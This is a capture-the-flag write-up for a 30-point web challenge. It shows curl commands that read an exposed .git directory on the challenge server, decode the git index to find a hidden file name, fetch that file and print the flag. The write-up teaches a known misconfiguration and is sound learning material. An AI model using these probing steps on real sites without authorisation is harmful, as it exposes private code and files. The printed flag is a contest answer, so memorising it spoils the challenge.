# Find Me Web Challenge Writeup

## Challenge Information

- **URL**: http://38.60.200.116:8086/
- **Category**: Web Security
- **Points**: 30


![](attachments/Pasted%20image%2020251130141346.png)

## Challenge
![](attachments/Pasted%20image%2020251130141614.png)


## Solution

### Step 1: Initial Reconnaissance

When accessing the challenge URL, we see a basic HTML page with a hint suggesting we don't need directory bruteforcing. This immediately suggests looking for other common web vulnerabilities.

### Step 2: Discovering the Exposed .git Directory

One of the first things to check in web challenges is whether there's an exposed `.git` directory. We can verify this by accessing:

```bash
curl -s http://38.60.200.116:8086/.git/config
```

**Result**: The `.git/config` file is accessible, confirming an exposed git repository!

```
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
[remote "origin"]
    url = https://github.com/T-Tools/blahblah
    fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
    remote = origin
    merge = refs/heads/main
```

### Step 3: Examining Git Files

We can access several git metadata files:

```bash
# Check HEAD
curl -s http://38.60.200.116:8086/.git/HEAD
# Output: ref: refs/heads/main

# Check logs
curl -s http://38.60.200.116:8086/.git/logs/HEAD
# Shows commit hash: fbbd33ce5e7d372509672aebffeee2df4d9c88b2

# Check current commit
curl -s http://38.60.200.116:8086/.git/refs/heads/main
# Output: fbbd33ce5e7d372509672aebffeee2df4d9c88b2
```

### Step 4: Analyzing the Git Index

The git index file (`.git/index`) contains information about all tracked files in the repository. Let's download and examine it:

```bash
curl -s http://38.60.200.116:8086/.git/index -o .git_index
xxd .git_index | head -30
```

Looking at the hex dump, we can identify the file structure:

- `DIRC` - Git index signature
- Version 2 format
- 3 entries

By examining the index carefully, we can spot filenames:

1. `README.md`
2. `fbf696303b1f08e15f7f2aa1c954adc6.txt` - **This looks interesting!**
3. `index.html`

### Step 5: Accessing the Hidden File

Since we found the filename `fbf696303b1f08e15f7f2aa1c954adc6.txt` in the git index, we can try accessing it directly:

```bash
curl -s http://38.60.200.116:8086/fbf696303b1f08e15f7f2aa1c954adc6.txt
```

**Flag obtained!**

## Flag

```
NOVA_CTF{finDiNg_f1le_pathS_iN_g17_1nd3x_1S_fuN_84ea17fed8eefbacb71d00a843fe9ec1}
```


![](attachments/Pasted%20image%2020251130141937.png)

